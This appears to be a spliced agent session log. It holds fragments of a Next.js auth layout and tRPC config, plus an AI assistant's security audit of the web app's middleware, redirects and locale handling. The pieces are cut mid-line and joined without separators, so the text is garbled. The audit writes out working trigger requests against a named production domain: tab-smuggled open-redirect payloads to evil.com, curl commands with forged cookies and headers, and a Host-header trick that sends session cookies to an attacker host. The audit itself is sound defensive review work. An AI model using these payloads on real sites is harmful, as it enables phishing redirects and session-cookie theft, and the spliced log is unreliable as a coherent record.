\"@/components/user/UserHeader\";\n\n/**\n * User Portal Layout\n *\n * Unified layout for all authenticated users (customers and admins).\n *\n * Features:\n * - Server-side authentication check\n * - Admin detection via email allowlist\n * - Conditional sidebar (only for admins)\n * - Header with user info and sign-out\n * - UserProvider context for child components\n *\n * Layout Variations:\n * - Admins: Full-width with sidebar on left\n * - Regular users: Centered content with max-width (like customer portal)\n */\nexport default async function UserLayout({\n  children,\n  params,\n}: {\n  children: React.ReactNode;\n  params: Promise<{ locale: string }>;\n}) {\n  const { locale } = await params;\n  const session = await auth.api.getSession({ headers: await headers() });\n\n  // Double-check auth (middleware should handle this, but be safe)\n  if (!session?.user) {\n    redirect(`/${locale}/user/sign-in`);\n  }\n\n  const user = session.user;\n\n  const isAdmin = user.role === \"admin\";\n\n  return (\n    <UserProvider email={user.email || \"\"} isAdmin={isAdmin}>\n      <div className=\"min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900\">\n        <div className=\"flex\">\n          {/* Sidebar - {"parentUuid":"ae93fa4e-ec7d-4be5-b0fe-c889e0a022a2","isSidechain":true,"promptId":"c4d76306-3d6f-4795-97b1-6d7124e0032e","agentId":"aaacbbc79f49a8837","type":"user","message":{"role":"user","content":[{"tool_use_id":"toolu_01Pvnb1WxvsuD5LSM71uUpRi","type":"tool_result","content":"/**\r\n * tRPC Server Configuration for App Router\r\n *\r\n * This file sets up:\r\n * 1. Context creation with Better Auth\r\n * 2. Three procedure types: public, protected, admin\r\n * 3. superjson transformer for date/Map/Set serialization\r\n *\r\n * ARCHITECTURE NOTES:\r\n * - Uses App Router pattern with fetchRequestHandler (not Pages Router createNextApiHandler)\r\n * - Context receives Headers object and checks Better Auth session\r\n * - Three-tier auth: publicProcedure (anyone), protectedProcedure (logged in), adminProcedure (role === \"admin\")\r\n */\r\nimport { initTRPC, TRPCError } from \"@trpc/server\";\r\nimport superjson from \"superjson\";\r\n\r\nimport type { User as BetterAuthUser } from \"better-auth/types\";\r\n\r\nimport { auth } from \"@/src/lib/auth\";\r\n\r\n/**\r\n * Context passed to every tRPC procedure.\r\n *\r\n * @property user - The authenticated Better Auth user, or null if not logged in\r\n * @property isAdmin - Whether the user is in the admin email whitelist\r\n * @property headers - Request headers (for rate limiting, IP extraction, etc.)\r\n */\r\nexport interface TRPCContext {\r\n  user: BetterAuthUser | null;\r\n  isAdmin: boolean;\r\n  headers: Headers;\r\n}\r\n\r\n/**\r\n * Creates tRPC context from incoming request headers.\r\n *\r\n * FLOW:\r\n * 1. Gets session from Better Auth using request headers\r\n * 2. Checks admin status via email whitelist\r\n * 3. Returns context object for use in all procedures\r\n *\r\n * @param opts - Object containing request headers (from App Router)\r\n * @returns Promise resolving to TRPCContext\r\n */\r\nexport async function createTRPCContext(opts: {\r\n  headers: Headers;\r\n}): Promise<TRPCContext> {\r\n  const session = await auth.api.getSession({ headers: opts.headers });\r\n  const user = session?.user ?? null;\r\n  const isAdmin = user?.role === \"admin\";\r\n\r\n  return { user, isAdmin, headers: opts.headers };\r\n}\r\n\r\n/**\r\n * Initialize tRPC with context type and superjson transformer.\r\n *\r\n * superjson enables serialization of:\r\n * - Date objects\r\n * - Map/Set\r\n * - BigInt\r\n * - undefined (preserved, not converted to null)\r\n */\r\nconst t = initTRPC.context<TRPCContext>().create({\r\n  transformer: superjson,\r\n  errorFormatter({ shape }) {\r\n    return shape;\r\n  },\r\n});\r\n\r\n/**\r\n * Middleware: Ensure user is authenticated.\r\n *\r\n * Throws UNAUTHORIZED if no user in context.\r\n * Narrows ctx.user type from User | null to User.\r\n */\r\nconst isAuthed = t.middleware(({ ctx, next }) => {\r\n  if (!ctx.user) {\r\n    throw new TRPCError({\r\n      code: \"UNAUTHORIZED\",\r\n      message: \"You must be signed in to access this resource\",\r\n    });\r\n  }\r\n  return next({\r\n    ctx: {\r\n      ...ctx,\r\n      user: ctx.user, // Now guaranteed non-null\r\n    },\r\n  });\r\n});\r\n\r\n/**\r\n * Middleware: Ensure user is an admin.\r\n *\r\n * CHECKS:\r\n * 1. User must be authenticated\r\n * 2. User must have role === \"admin\" in the database\r\n *\r\n * Throws UNAUTHORIZED if not logged in, FORBIDDEN if not admin.\r\n */\r\nconst isAdmin = t.middleware(({ ctx, next }) => {\r\n  if (!ctx.user) {\r\n    throw new TRPCError({\r\n      code: \"UNAUTHORIZED\",\r\n      message: \"You must be signed in\",\r\n    });\r\n  }\r\n  if (!ctx.isAdmin) {\r\n    throw new TRPCError({\r\n      code: \"FORBIDDEN\",\r\n      message: \"Admin access required\",\r\n    });\r\n  }\r\n  return next({\r\n    ctx: {\r\n      ...ctx,\r\n      user: ctx.user,\r\n    },\r\n  });\r\n});\r\n\r\n// ============================================================================\r\n// EXPORTS\r\n// ============================================================================\r\n\r\n/**\r\n * Creates a new tRPC router.\r\n * Use this to define procedure groups (e.g., licenseRouter, adminRouter).\r\n */\r\nexport const createTRPCRouter = t.router;\r\n\r\n/**\r\n * Public procedure - no authentication required.\r\n * Use for: license validation, checkout URLs, public downloads\r\n */\r\nexport const publicProcedure = t.procedure;\r\n\r\n/**\r\n * Protected procedure - requires authenticated user.\r\n * Use for: user-specific operations that any logged-in user can perform\r\n */\r\nexport const protectedProcedure = t.procedure.use(isAuthed);\r\n\r\n/**\r\n * Admin procedure - requires admin email.\r\n * Use for: dashboard stats, customer management, sync operations\r\n */\r\nexport const adminProcedure = t.procedure.use(isAdmin);","is_error":false}]},"uuid":"7fdac182-83f4-47aa-b07e-f152bbb46ce4","timestamp":"2026-07-29T11:44:28.377Z","toolUseResult":{"stdout":"/**\r\n * tRPC Server Configuration for App Router\r\n *\r\n * This file sets up:\r\n * 1. Context creation with Better Auth\r\n * 2. Three procedure types: public, protected, admin\r\n * 3. superjson transformer for date/Map/Set serialization\r\n *\r\n * ARCHITECTURE NOTES:\r\n * - Uses App Router pattern with fetchRequestHandler (not Pages Router createNextApiHandler)\r\n * - Context receives Headers object and checks Better Auth session\r\n * - Three-tier auth: publicProcedure (anyone), protectedProcedure (logged in), adminProcedure (role === \"admin\")\r\n */\r\nimport { initTRPC, TRPCError } from \"@trpc/server\";\r\nimport superjson from \"superjson\";\r\n\r\nimport type { User as BetterAuthUser } from \"better-auth/types\";\r\n\r\nimport { auth } from \"@/src/lib/auth\";\r\n\r\n/**\r\n * Context passed to every tRPC procedure.\r\n *\r\n * @property user - The authenticated Better Auth user, or null if not logged in\r\n * @property isAdmin - Whether the user is in the admin email whitelist\r\n * @property headers - Request headers (for rate limiting, IP extraction, etc.)\r\n */\r\nexport interface TRPCContext {\r\n  user: BetterAuthUser | null;\r\n  isAdmin: boolean;\r\n  headers: Headers;\r\n}\r\n\r\n/**\r\n * Creates tRPC context from incoming request headers.\r\n *\r\n * FLOW:\r\n * 1. Gets session from Better Auth using request headers\r\n * 2. Checks admin status via email whitelist\r\n * 3. Returns context object for use in all procedures\r\n *\r\n * @param opts - Object containing request headers (from App Router)\r\n * @returns Promise resolving to TRPCContext\r\n */\r\nexport async function createTRPCContext(opts: {\r\n  headers: Headers;\r\n}): Promise<TRPCContext> {\r\n  const session = await auth.api.getSession({ headers: opts.headers });\r\n  const user = session?.user ?? null;\r\n  const isAdmin = user?.role === \"admin\";\r\n\r\n  return { user, isAdmin, headers: opts.headers };\r\n}\r\n\r\n/**\r\n * Initialize tRPC with context type and superjson transformer.\r\n *\r\n * superjson enables serialization of:\r\n * - Date objects\r\n * - Map/Set\r\n * - BigInt\r\n * - undefined (preserved, not converted to null)\r\n */\r\nconst t = initTRPC.context<TRPCContext>().create({\r\n  transformer: superjson,\r\n  errorFormatter({ shape }) {\r\n    return shape;\r\n  },\r\n});\r\n\r\n/**\r\n * Middleware: Ensure user is authenticated.\r\n *\r\n * Throws UNAUTHORIZED if no user in context.\r\n * Narrows ctx.user type from User | null to User.\r\n */\r\nconst isAuthed = t.middleware(({ ctx, next }) => {\r\n  if (!ctx.user) {\r\n    throw new TRPCError({\r\n      code: \"UNAUTHORIZED\",\r\n      message: \"You must be signed in to access this resource\",\r\n    });\r\n  }\r\n  return next({\r\n    ctx: {\r\n      ...ctx,\r\n      user: ctx.user, // Now guaranteed non-null\r\n    },\r\n  });\r\n});\r\n\r\n/**\r\n * Middleware: Ensure user is an admin.\r\n *\r\n * CHECKS:\r\n * 1. User must be authenticated\r\n * 2. User must have role === \"admin\" in the database\r\n *\r\n * Throws UNAUTHORIZED if not logged in, FORBIDDEN if not admin.\r\n */\r\nconst isAdmin = t.middleware(({ ctx, next }) => {\r\n  if (!ctx.user) {\r\n    throw new TRPCError({\r\n      code: \"UNAUTHORIZED\",\r\n      message: \"You must be signed in\",\r\n    });\r\n  }\r\n  if (!ctx.isAdmin) {\r\n    throw new TRPCError({\r\n      code: \"FORBIDDEN\",\r\n      message: \"Admin access required\",\r\n    });\r\n  }\r\n  return next({\r\n    ctx: {\r\n      ...ctx,\r\n      user: ctx.user,\r\n    },\r\n  });\r\n});\r\n\r\n// ============================================================================\r\n// EXPORTS\r\n// ============================================================================\r\n\r\n/**\r\n * Creates a new tRPC router.\r\n * Use this to define procedure groups (e.g., licenseRouter, adminRouter).\r\n */\r\nexport const createTRPCRouter = t.router;\r\n\r\n/**\r\n * Public procedure - no authentication required.\r\n * Use for: license validation, checkout URLs, public downloads\r\n */\r\nexport const publicProcedure = t.procedure;\r\n\r\n/**\r\n * Protected procedure - requires authenticated user.\r\n * Use for: user-specific operations that any logged-in user can perform\r\n */\r\nexport const protectedProcedure = t.procedure.use(isAuthed);\r\n\r\n/**\r\n * Admin procedure - requires admin email.\r\n * Use for: dashboard stats, customer management, sync operations\r\n */\r\nexport const adminProcedure = t.procedure.use(isAdmin);","stderr":"","interrupted":false,"isImage":false,"noOutputExpected":false},"sourceToolAssistantUUID":"ae93fa4e-ec7d-4be5-b0fe-c889e0a022a2","userType":"external","entrypoint":"cli","cwd":"/Users/ray/Desktop/ray-os","sessionId":"0ad0c358-bd4c-4ff8-872f-2f81b1b9e66c","version":"2.1.220","gitBranch":"main","slug":"lively-giggling-hammock"}

{"parentUuid":"b445166f-90b3-4f2e-9cfc-150cd7d70265","isSidechain":true,"promptId":"872714b7-1488-4cc4-8bad-5341f8c86fd3","agentId":"aaacbbc79f49a8837","type":"user","message":{"role":"user","content":[{"tool_use_id":"toolu_01AuuUBWHFPmQE5uMpxhdXqM","type":"tool_result","content":"===== app/[locale]/manage-billing/page.tsx\nimport { redirect } from \"next/navigation\";\n\nexport default async function ManageBilling({\n  params,\n}: {\n  params: Promise<{ locale: string }>;\n}) {\n  const { locale } = await params;\n  redirect(`/${locale}/user/dashboard`);\n}\n===== app/[locale]/customer/page.tsx\nimport { redirect } from \"next/navigation\";\n\nexport default async function CustomerRedirect({\n  params,\n}: {\n  params: Promise<{ locale: string }>;\n}) {\n  const { locale } = await params;\n  redirect(`/${locale}/user`);\n}\n===== app/[locale]/customer/dashboard/page.tsx\nimport { redirect } from \"next/navigation\";\n\nexport default async function CustomerDashboardRedirect({\n  params,\n}: {\n  params: Promise<{ locale: string }>;\n}) {\n  const { locale } = await params;\n  redirect(`/${locale}/user/dashboard`);\n}\n===== app/[locale]/customer/sign-in/page.tsx\nimport { redirect } from \"next/navigation\";\n\nexport default async function CustomerSignInRedirect({\n  params,\n}: {\n  params: Promise<{ locale: string }>;\n}) {\n  const { locale } = await params;\n  redirect(`/${locale}/user/sign-in`);\n}\n===== app/[locale]/checkout/page.tsx\nimport { redirect } from \"next/navigation\";\n\n/**\n * /checkout — legacy purchase entry point (kept as a redirect).\n *\n * The standalone license checkout was retired: buying credits now mints the key\n * (the license IS the wallet). Native apps (macOS `LicenseManager.openPurchasePage`,\n * Windows `PurchaseUrl`) and the docs still link to `/checkout`, so this page\n * stays as a permanent redirect into the credits buy flow. {"parentUuid":"555986f5-c608-44f0-b3c5-ba1f1082209e","isSidechain":true,"agentId":"aaacbbc79f49a8837","message":{"model":"claude-opus-5","id":"msg_011CdWJACmCjHHRgdeGaXWMY","type":"message","role":"assistant","content":[{"type":"text","text":"Trace complete. Here are the findings.\n\n---\n\n## T11 — Next.js request gate / admin gates / locale plumbing: seam bugs\n\n---\n\n### BUG-1 — `sanitizeReturnTo` and the WHATWG URL parser disagree about what \"starts with `//`\" means → open redirect\n\n**trace**\n1. `nextjs/middleware.ts:132` `isUserSignIn` branch, `hasSessionCookie(request)` true (`:33-38`, presence-only)\n2. `nextjs/middleware.ts:135` `request.nextUrl.searchParams.get(\"returnTo\")` — already percent-decoded\n3. `nextjs/src/lib/license-key-redirect.ts:9-23` `sanitizeReturnTo` — four raw `String.prototype.startsWith` checks on the decoded string\n4. `nextjs/middleware.ts:137` `NextResponse.redirect(new URL(redirectUrl, request.url))`\n\n**seam** — hop 3 → hop 4. `sanitizeReturnTo` validates the string with `startsWith(\"//\")` / `startsWith(\"/\\\\\")`. `new URL()` implements the WHATWG basic URL parser, whose **step 2 removes all ASCII tab, LF and CR from the input before parsing**. So a string that is not protocol-relative to `startsWith` *becomes* protocol-relative to the parser. The sanitizer's syntactic model and the parser's model are different languages.\n\n**trigger_sketch** (empirically verified with Node's `URL`, not merely reasoned):\n```\nGET /en/user/sign-in?returnTo=%2F%09%2Fevil.com\nCookie: better-auth.session_token=anything\n```\n`sanitizeReturnTo` returns `\"/\\t/evil.com\"` unchanged → `new URL(\"/\\t/evil.com\", \"https://hyperwhisper.com/en/user/sign-in\").href` === **`https://evil.com/`**. Same result for `%0A` and `%0D`, and for `%2F%09%5C%5Cevil.com`.\n\n**consequence** — `hyperwhisper.com` issues a 307 to an attacker origin for any logged-in visitor. Standard open redirect: phishing with a trusted domain in the visible URL, and it defeats any allowlist that trusts `hyperwhisper.com` as a redirect target. The second call site, `app/[locale]/user/sign-in/page.tsx:44` → `router.push(data.redirect)` (`:71`), has the same shape post-license-key-auth, and the same value is sent as `callbackURL` into the emailed magic link (`:95`).\n\n**Corroborating evidence that this is a genuine blind spot, not a known accepted risk:** `nextjs/tests/license-key-redirect.test.ts:61-65` is named *\"blocks protocol-relative and backslash open redirects\"* and asserts exactly `//evil.com`, `/\\evil.com`, `https://evil.com`. The whitespace-smuggled variants are the untested neighbour of every case the author thought of. The doc comment at `license-key-redirect.ts:3-8` likewise enumerates only the two prefixes.\n\n**confidence: high**\n\n---\n\n### BUG-2 — cookie-presence gate vs. session-validity gate redirect at each other → unrecoverable infinite redirect loop on the whole `/user` portal\n\n**trace**\n1. `nextjs/middleware.ts:113-123` — `/[locale]/user/*` admitted iff `hasSessionCookie` (`:33-38`) — **presence only, no signature check**\n2. `nextjs/app/[locale]/user/(authenticated)/layout.tsx:33` / `dashboard/page.tsx:28` — `auth.api.getSession` returns `null` for an unverifiable cookie → `redirect(\\`/${locale}/user/sign-in\\`)` (`:37`, `:31`)\n3. `nextjs/middleware.ts:132-137` — sign-in route sees the cookie is still *present* → `NextResponse.redirect` back to `/${locale}/user/dashboard`\n4. → hop 2\n\n**seam** — hop 1 → hop 2. Middleware's predicate is *\"a cookie with this name exists\"*; the page's predicate is *\"this cookie decodes to a live DB session\"*. Each layer is individually correct and each redirects toward the other layer's happy path. Neither layer clears the cookie, so the loop has no exit.\n\n**trigger_sketch** — any state where the cookie outlives the session. Concretely:\n- Rotate `BETTER_AUTH_SECRET` or change `BETTER_AUTH_URL` (`src/lib/auth.ts:10`) → every existing browser cookie is now unverifiable → **every logged-in user is locked into the loop simultaneously**.\n- `hasSessionCookie` accepts *either* `better-auth.session_token` *or* `__Secure-better-auth.session_token` (`:35-36`). In production better-auth only issues/reads the `__Secure-` one. A stale non-secure `better-auth.session_token` left on the domain (dev, a prior HTTP deployment, or planted) satisfies middleware forever while better-auth ignores it. `curl -H 'Cookie: better-auth.session_token=x' https://hyperwhisper.com/en/user/dashboard` reproduces it directly.\n- The sign-out 500 in BUG-3 below produces this state deterministically.\n\n**consequence** — `ERR_TOO_MANY_REDIRECTS` on `/user/dashboard`, `/user`, `/user/devices`, `/user/customers` **and on `/user/sign-in` itself**. The user cannot reach the sign-in page to fix it and cannot sign out, because sign-out is a POST from a page they can't load. Only manually clearing cookies via devtools recovers. This is the highest-impact item in the unit.\n\n**confidence: high**\n\n---\n\n### BUG-3 — sign-out revokes the server session but the `Set-Cookie` and redirect are never delivered\n\n**trace**\n1. `nextjs/app/[locale]/user/auth/sign-out/route.ts:16-19` — `await auth.api.signOut({headers, asResponse:true})` — **side effect completes: the DB session row is revoked**\n2. `:21-24` — `const redirect = NextResponse.redirect(...)`\n3. `:26-35` — `redirect.headers.set(\"set-cookie\", ...)` in both branches\n4. `:36` — function ends. **No `return`.** Verified: the handler returns `undefined`.\n5. `node_modules/next/dist/server/route-modules/app-route/module.js:463` — Next throws ``No response is returned from route handler '...'. Ensure you return a `Response` or a `NextResponse` in all branches of your handler.`` → 500\n\n**seam** — hop 1 → hop 4. The revocation is an irreversible side effect that has already been committed to the database by the time the missing `return` turns the request into a 500. The response object carrying the compensating state change (cookie clear) is fully constructed and then garbage-collected.\n\n**trigger_sketch** `POST /en/user/auth/sign-out` with a valid session cookie.\n\n**consequence** — server-side: logged out. Browser-side: still holds `better-auth.session_token`, sees an opaque 500, never navigates to sign-in. That divergence is exactly the precondition for BUG-2, so the user lands in the unrecoverable loop. **Mitigating fact:** repo-wide grep finds **zero callers** of this route — `components/user/UserHeader.tsx:21` uses `authClient.signOut()` instead. The route is dead code reachable only by direct POST, which is why the 500 has never been observed. It is also explicitly carved out of the middleware gate (`middleware.ts:79`, `:116`), so it is reachable unauthenticated-by-middleware.\n\n**confidence: high** (that it 500s and never returns); **medium** (that a real user reaches it)\n\n---\n\n### BUG-4 — `x-pathname` is written to the response and read from the request; the two never meet\n\n**trace**\n1. `nextjs/middleware.ts:108,127,141,147` — `response.headers.set(\"x-pathname\", pathname)` on the object *returned to the client*. Grep confirms **no `NextResponse.next({request:{headers}})` anywhere in the repo** — the only mechanism that would propagate a header into the render.\n2. `nextjs/app/[locale]/layout.tsx:54` — `headersList.get(\"x-pathname\")` where `headersList = await headers()` — the **inbound request** headers.\n3. `→ \"\" → stripLocalePrefix(\"\")` (`src/i18n/locales.ts:107-110`, `segments.length === 0` → `\"\"`)\n4. `→ buildAlternateLanguageMap(baseUrl, \"\")` (`:120-129`) and `canonical` (`layout.tsx:84`)\n\n**seam** — hop 1 → hop 2. Middleware guarantees the *client* sees `x-pathname`. The layout assumes the *server render* sees it. Both are locally correct; the channel between them does not exist.\n\n**consequence (a), ordinary traffic — real SEO bug:** `pathname` is always `\"\"`, so on **every page of the site**:\n- `canonical` = `https://hyperwhisper.com/en` (locale homepage)\n- all 40 `hreflang` alternates + `x-default` = `https://hyperwhisper.com/{loc}`\n\nEvery URL on the domain declares the locale homepage as its canonical. Search engines will consolidate the entire site into 40 homepages and drop the rest from the index. Silent — nothing errors, the tags are well-formed.\n\n**consequence (b), attacker-supplied header:** `curl -H 'x-pathname: /pwn' https://hyperwhisper.com/en/pricing` → canonical becomes `https://hyperwhisper.com/en/pwn`. **Not** an XSS: Next renders `<link rel=\"canonical\" href={...}>` through React, which escapes attribute values, and neither `stripLocalePrefix` nor `buildAlternateLanguageMap` can produce a cross-origin URL (`buildAlternateLanguageMap:121` force-prefixes `/`, and `${baseUrl}/${locale}${path}` keeps the origin literal even for `x-pathname: https://evil.com`). Vercel forwards arbitrary request headers rather than stripping unknown ones, but Next emits no `Vary: x-pathname` — this would be a cache-poisoning vector except that (b) is self-limiting, see below. **(a) is the real bug; (b) is cosmetic.**\n\n**Third-order consequence worth flagging separately:** calling `headers()` inside `generateMetadata` opts the entire `[locale]` segment into dynamic rendering, which nullifies both `generateStaticParams` (`layout.tsx:44-46`, 40 locales) and the explicit `setRequestLocale(locale)` (`:162`, whose only purpose is \"Enable static rendering\"). The site is fully dynamic; the static-rendering scaffolding is inert. This is also why (b) can't poison a CDN cache.\n\n**confidence: high**\n\n---\n\n### BUG-5 — `<html lang>` reads a header next-intl v4 does not emit\n\n**trace**\n1. `nextjs/app/layout.tsx:12` — `(await headers()).get(\"x-next-intl-locale\") ?? \"en\"`\n2. `:15` — `<html suppressHydrationWarning lang={locale}>`\n\n**seam** — the app's assumption about next-intl's middleware contract vs. next-intl 4.13.0's actual behaviour. `grep -r \"x-next-intl-locale\"` over `node_modules/next-intl` and `node_modules/use-intl` returns **nothing** — and so does `grep -o \"x-next-intl[a-z-]*\"`. The header was a next-intl v2-era implementation detail; it does not exist in v4. `package.json:48` pins `^4.9.1`, resolved 4.13.0.\n\n**trigger_sketch** `GET /ja/` (or any of the 39 non-English locales).\n\n**consequence** — `<html lang=\"en\">` on every localized page, permanently, while `data-locale` two layers down (`app/[locale]/layout.tsx:177`) carries the correct value. Screen readers apply English pronunciation to Japanese/Arabic/Hindi content; search engines get a `lang` that contradicts the `hreflang` set. Compounds BUG-4 (a): the two SEO signals are independently wrong in different ways. Note also that `dir=\"rtl\"` is never set for `ar`/`he`.\n\n**confidence: high**\n\n---\n\n### BUG-6 — the dead `getRequestConfig` is the strict one; the live one silently accepts unknown locales\n\n**trace**\n1. `nextjs/next.config.mjs:10` — `createNextIntlPlugin()`, **no argument**\n2. `node_modules/next-intl/dist/esm/production/plugin/getNextConfig.js` — resolution order is `./i18n/request.{ts,tsx,js,jsx}` then `./src/i18n/request.{...}`; it never considers a bare `./i18n.ts`\n3. → resolves `nextjs/src/i18n/request.ts` (**EP-86 is live**). `:9-11`: unknown locale → `locale = routing.defaultLocale`, no error\n4. `nextjs/i18n.ts:8-16` (**EP-85**) with its `notFound()` at `:10` is **never wired as a request config**. It survives only because `app/[locale]/layout.tsx:31` imports `{ locales }` from `@/i18n` — a value re-export, which is why the file looks alive to a reader\n\n**seam** — a resolution-convention seam. `i18n.ts` was correct under next-intl v3's older default; the v4 plugin looks in different places. Nothing errors, because the fallback file exists and is valid. A reviewer opening `i18n.ts` sees a `notFound()` guard and reasonably concludes locales are validated.\n\n**consequence** — `params.locale` is unvalidated everywhere it is consumed: `layout.tsx:84` (`canonical`), `:93` (`openGraph.url`), `:177` (`data-locale`), and the six unguarded `redirect()` templates (`user/page.tsx:14`, `manage-billing/page.tsx:9`, `customer/page.tsx:9`, `customer/dashboard/page.tsx:9`, `customer/sign-in/page.tsx:9`, `checkout/page.tsx:29`). **However:** for ordinary traffic next-intl's middleware redirects `/xx/foo` → `/en/xx/foo` before the page renders, which mostly contains it. See BUG-7 for the path that escapes that containment.\n\nI probed the two escalation shapes and neither reaches an open redirect on its own: a newline in the locale segment (`%0A`) yields an invalid `Location` header value that Node rejects rather than splitting the response (forced 500, not response splitting), and `..` is normalized by the URL parser before it leaves.\n\n**confidence: high** (which config is live); **medium** (reachability of the unvalidated locale — depends on BUG-7)\n\n---\n\n### BUG-7 — the middleware matcher's dot-exclusion is a full middleware bypass for any route\n\n**trace**\n1. `nextjs/middleware.ts:159` — `matcher: [\"/((?!api|models(?:/|$)|_next|_vercel|docs|.*\\\\..*).*)\"]`. The `.*\\..*` alternative in the negative lookahead excludes **any path containing a dot anywhere**, not just a trailing file extension.\n2. `[locale]` is a dynamic segment and matches a value containing a dot.\n\n**seam** — the matcher's intent (comment at `:157`: *\"Static files with extensions\"*) vs. its actual language (*any path with a dot*). The locale segment is attacker-chosen and unvalidated (BUG-6), so it can carry the dot.\n\n**trigger_sketch** `GET /e.n/user/customers` — middleware never executes, so the `USER_CUSTOMERS_REGEX` admin gate at `middleware.ts:87-104` never runs. Likewise `GET /e.n/user` reaches `app/[locale]/user/page.tsx:14`, which has **no auth check at all** and relies entirely on the comment at `:6` (\"Middleware handles unauthenticated users\").\n\n**consequence — I want to be precise that this is NOT an authz bypass.** I enumerated every route under the matcher whose only gate is middleware, and the answer is **none**:\n\n| route | middleware gate | page/layout gate |\n|---|---|---|\n| `/[locale]/user/customers` | admin (`:87-104`) | admin — `customers/page.tsx:29,37` |\n| `/[locale]/user/devices` | **none** | admin — `devices/page.tsx:26,32` |\n| `/[locale]/user/dashboard` | cookie presence | session — `dashboard/page.tsx:28` |\n| `/[locale]/user` | cookie presence | none, but only `redirect()`s |\n| all of the above | | session — `(authenticated)/layout.tsx:33` |\n\nSo the cookie-presence gate at `:113-123` is **defence-in-depth theatre for authorization** — it buys an attacker nothing, because every page re-checks. Its real cost is that it is load-bearing for the BUG-2 loop. What BUG-7 *does* buy is: skipping locale normalization (feeding BUG-6), skipping the `x-pathname` set, and reaching `user/page.tsx:14`'s unguarded `redirect()` with a controlled locale.\n\n**On `/user/devices` specifically (EP-51):** I checked `DevicesClient.tsx:28,190` → `api.admin.devices.list` / `.forLicense` → `server/api/routers/admin/devices.ts:20,42`, both `adminProcedure` → `server/api/trpc.ts` `isAdmin` middleware, which re-derives `isAdmin` from `auth.api.getSession` in `createTRPCContext:47-49` and throws `FORBIDDEN`. **The data is independently protected; the page gate is redundant, not a single point of failure.** A non-admin who reached the page would get an empty shell and a `FORBIDDEN` toast.\n\n**confidence: high** (matcher bypass); **high** (that it is not an authz bypass)\n\n---\n\n### BUG-8 — `%2F` in the locale segment reaches an unguarded `redirect()`\n\n**trace**\n1. `GET /%2Fevil.com/user` — contains a dot → middleware skipped (BUG-7)\n2. `node_modules/next/dist/shared/lib/router/utils/route-matcher.js:18-20` — dynamic params are passed through `decodeURIComponent` → `params.locale === \"/evil.com\"`\n3. `nextjs/app/[locale]/user/page.tsx:14` — `redirect(\\`/${locale}/user/dashboard\\`)` → `Location: //evil.com/user/dashboard` → protocol-relative → open redirect\n\n**seam** — hop 2 → hop 3. The route matcher guarantees \"one path segment\"; after decoding, the *value* is no longer one path segment, but `user/page.tsx` interpolates it into a path template as though it still were.\n\n**consequence** — a second open redirect, unauthenticated (unlike BUG-1, which needs a session cookie), on five more templates (`manage-billing`, `customer`, `customer/dashboard`, `customer/sign-in`, `checkout`).\n\n**Why I'm hedging:** `node_modules/next/dist/server/lib/router-utils/decode-path-params.js` + `shared/lib/router/utils/escape-path-delimiters.js` show Next re-escaping `%2f` → `%252f` on one code path, and I could not determine without a running server whether Vercel's edge normalizes `%2F` before Next sees it. Confirming needs a one-line runtime probe (`curl -sI 'https://…/%2Fevil.com/user'` and read `Location`). BUG-1 is the same class of defect and is fully confirmed, so this is worth the probe.\n\n**confidence: medium**\n\n---\n\n### BUG-9 — middleware's internal `get-session` fetch trusts the Host header and forwards the victim's cookies\n\n**trace** `middleware.ts:51` `const baseUrl = request.nextUrl.origin` → `:52-56` `fetch(\\`${baseUrl}/api/auth/get-session\\`, {headers:{cookie: request.headers.get(\"cookie\")}})`\n\n**seam** — `nextUrl.origin` is derived from the inbound `Host` / `X-Forwarded-Host` header, i.e. it is *request-controlled*, but `:52` treats it as *\"our own origin\"* and attaches the full cookie jar to it on that basis.\n\n**trigger_sketch** `GET /en/user/customers` with `Host: attacker.tld` → server-side `fetch(\"https://attacker.tld/api/auth/get-session\", {headers:{cookie:\"__Secure-better-auth.session_token=…\"}})`.\n\n**consequence** — server-side session-cookie exfiltration to an attacker origin. **Strongly mitigated in production:** Vercel rejects Host values not bound to the project at the edge, so this is only live for self-hosted/proxied deployments or a misconfigured wildcard domain. Two lesser issues on the same line: the fetch has **no timeout or AbortSignal**, so a hung auth API stalls middleware for the full function duration on every `/user/customers` request; and the failure path (`:58,:62-64` → `return null`) **fails closed** for authz (good) but redirects to `/user/sign-in`, which then bounces back on cookie presence — a transient auth blip therefore produces the BUG-2 loop rather than an error page.\n\n**confidence: medium** (self-hosted); **low** (on Vercel)\n\n---\n\n### BUG-10 — `global.localStorage` stub: not a data leak, but request-order-dependent global state\n\n**trace** `nextjs/app/[locale]/layout.tsx:4-15` — module-scope `if (typeof window === \"undefined\") (global as any).localStorage = {…}`\n\n**seam** — a *module-load-time* side effect used to fix a *per-request* symptom. It executes once per server process, at whatever moment the `[locale]` layout module is first evaluated.\n\n**Ruling out the cross-request leak explicitly:** the stub is stateless (`getItem: () => null`, `setItem: noop`), so one request's write is *not* visible to another — there is no storage. The leak hypothesis is false.\n\n**The real defects:**\n1. **Order-dependent global.** `app/layout.tsx`, all `/api/*` route handlers, and every tRPC procedure run in the same process but do not import `app/[locale]/layout.tsx`. Whether `globalThis.localStorage` is defined during an API request therefore depends on whether a page request warmed that module first in that lambda instance. Any dependency that feature-detects `typeof localStorage !== \"undefined\"` will take the browser branch on some requests and the server branch on others, in the same deployment — a genuinely miserable heisenbug class.\n2. **It is unnecessary.** The only `localStorage` reads in the repo are `components/layout/LayoutWrapper.tsx:30` and `:37` — inside a `useEffect` and a click handler in a `\"use client\"` component (`:1`). Neither can execute during SSR. The stated justification in the comment at `:3` describes a symptom that cannot arise from any current call site.\n3. **Import-ordering fragility.** The side-effect block sits between `import \"@/styles/globals.css\"` (`:1`) and the remaining imports (`:17-37`). ES module semantics hoist *all* those imports above the statement, so the stub is installed **after** `next-intl`, `next-themes`, `@heroui`, and `Providers` have already been evaluated. If any of them captured `localStorage` at module scope — the exact scenario this code exists to defend against — the polyfill lands too late to help. It reads as though it runs first; it does not.\n\n**confidence: medium** (order-dependence is real); **high** (the code is dead and mis-ordered)\n\n---\n\n## Summary of priority\n\n1. **BUG-2** (redirect-loop lockout) — highest blast radius; one secret rotation locks out the entire user base with no self-service recovery.\n2. **BUG-1** (tab/newline open redirect) — fully confirmed, trivially exploitable, and the existing test file shows the gap was never considered.\n3. **BUG-4(a)** (canonical collapse) — silent, sitewide, currently costing organic traffic.\n4. **BUG-3, BUG-5, BUG-6, BUG-7** — confirmed defects, lower or contingent impact.\n5. **BUG-8, BUG-9, BUG-10** — need a runtime probe or a non-Vercel deployment to land.\n\nA common thread worth naming: **five of these ten are the same seam** — a layer that validates a *string* handing off to a layer that parses a *URL* (BUG-1, BUG-8), or a layer that checks *presence* handing off to a layer that checks *validity* (BUG-2, 